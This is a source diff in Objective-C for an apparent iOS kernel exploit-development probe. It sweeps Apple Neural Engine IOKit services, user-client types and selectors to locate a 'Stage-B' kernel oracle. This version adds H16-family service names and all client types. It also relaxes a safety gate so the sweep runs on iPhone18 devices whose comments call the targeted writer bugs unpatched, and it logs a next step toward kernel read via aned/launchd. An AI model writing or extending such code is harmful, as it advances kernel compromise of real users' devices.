@@ -27,7 +27,7 @@
 #import <unistd.h>
 #import <stdarg.h>
 
-#define P109_BUILD @"p109-ane-selsweep-v3-sel214"
+#define P109_BUILD @"p109-ane-selsweep-v4-h16names"
 
 typedef mach_port_t io_object_t;
 typedef mach_port_t io_service_t;
@@ -90,7 +90,12 @@ static NSString *p109_krname(kern_return_t kr) {
     p109_log(@"ANE sel sweep, Stage-B kernel oracle (note 258/259).");
     p109_log(@"input = pure 0xDEADBEEF u32 pattern (any pid offset reads DEADBEEF).");
     p109_log(@"kr 0x2f0 with klog 'Cannot find task from the given pid' = the Stage-B door.");
-    if (stop) {
+    /* v4 (advisory-149230 cross-ref, 2026-10-27): the A14-only gate stopped
+       this sweep on the 17 — but the 43748 writer is UNPATCHED on 27.0
+       (24A435, note 272 §1) and 112696/84494 are 27.2-only fixes (LIVE on
+       both devices). Allow T8150 27.x too; everything else still stops. */
+    if (stop && !([[LabDeviceProfile machine] hasPrefix:@"iPhone18,"] &&
+                  [[LabDeviceProfile osversion] hasPrefix:@"24A"])) {
         p109_log(stop);
         if (p109_fd >= 0) { fcntl(p109_fd, F_FULLFSYNC); close(p109_fd); p109_fd = -1; }
         return p109_buf;
@@ -111,10 +116,23 @@ static NSString *p109_krname(kern_return_t kr) {
         p109_log(@"dlsym IOKit symbols missing"); goto done;
     }
 
-    static const char *kServices[] = { "H11ANEIn", "H1xANELoadBalancer" };
+    /* v4: the H16 (T8150/27.0) family publishes services under its own
+       names — "H11ANEIn"-only matching produced a 17-side name-miss risk.
+       Try every plausible class name; only FOUND services are swept. */
+    static const char *kServices[] = {
+        "H11ANEIn",               /* T8101/T8020 in-path UC (23F77 law)  */
+        "H1xANELoadBalancer",     /* cross-gen LB front door             */
+        "H16ANEIn",               /* T8150 candidate (H16 kext family)   */
+        "AppleH16ANEInterface",   /* T8150 kext class name (24A435)      */
+        "AppleH11ANEInterface",   /* T8101 kext class name (23F77)       */
+        "H16ANELoadBalancer",     /* H16-spelled LB variant              */
+        "H11ANEDriver",
+        "H16ANEDriver",
+    };
+    const int kNServices = (int)(sizeof(kServices) / sizeof(kServices[0]));
     const uint32_t kTypes[] = { 0, 1, 2, 3, 4 };  /* v2: type0 denied 2c7 on-device; the program-loading client is a higher type */
 
-    for (int sv = 0; sv < 2; sv++) {
+    for (int sv = 0; sv < kNServices; sv++) {
         CFMutableDictionaryRef md = pMatching(kServices[sv]);
         p109_log([NSString stringWithFormat:@"[svc] %@ matching=%@",
                   @(kServices[sv]), md ? @"OK" : @"nil"]);
@@ -129,7 +147,10 @@ static NSString *p109_krname(kern_return_t kr) {
         if (!svc) continue;
         p109_log([NSString stringWithFormat:@"[svc] %@ FOUND — sweep open", @(kServices[sv])]);
 
-        for (int ti = 0; ti < 2; ti++) {
+        for (int ti = 0; ti < 5; ti++) {   /* v4: ALL UC types 0..4 (v2's
+           note said the program-loading client is a higher type; ti<2 never
+           reached it). Open-only for unlisted types; full sel sweep per
+           opened connection, same as v3. */
             io_connect_t conn = 0;
             kern_return_t okr = pOpen(svc, mach_task_self(), kTypes[ti], &conn);
             if (okr != KERN_SUCCESS) {
@@ -169,6 +190,8 @@ static NSString *p109_krname(kern_return_t kr) {
     }
 done:
     p109_log(@"=== VERDICT: sels with STAGE-B-HIT(2f0) = the Stage-B door; ===");
+    p109_log(@"v4 adds: T8150/24A435 H16 service names + UC types 0..4 (the direct-UC");
+    p109_log(@"  reachability answer for 43748-out-of-framework + 112696/84494, both 27.2-only fixes).");
     p109_log(@"next: same sel with pid=aned/launchd (kern.proc) = the borrow fire. hasKread stays NO.");
     if (p109_fd >= 0) { fcntl(p109_fd, F_FULLFSYNC); close(p109_fd); p109_fd = -1; }
     return p109_buf;
